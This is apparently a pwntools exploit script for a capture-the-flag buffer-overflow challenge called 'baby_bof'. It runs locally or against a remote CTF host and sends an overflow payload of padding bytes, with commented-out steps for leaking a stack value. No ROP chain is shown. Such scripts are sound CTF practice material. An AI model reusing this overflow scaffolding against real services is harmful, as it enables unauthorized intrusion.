#!/usr/bin/python3

from pwn import *

exe = ELF('baby_bof_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x2BCB

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('worker05.gcc-ctf.com', 11103)
else:
        p = process(exe.path)

GDB()
# sla(b'> ', '1')
# sa(b'> ', b'a'*0x49)
# p.recvuntil(b'a'*0x48)
# leak = u64(p.recv(8)) - 0x61
# info("leak: " +hex(leak))
payload = b'a'*0x48
payload = payload.ljust(0x10b8)  + b'aaaa'
sla(b'> ', '1')
sa(b'> ', payload)


p.interactive()
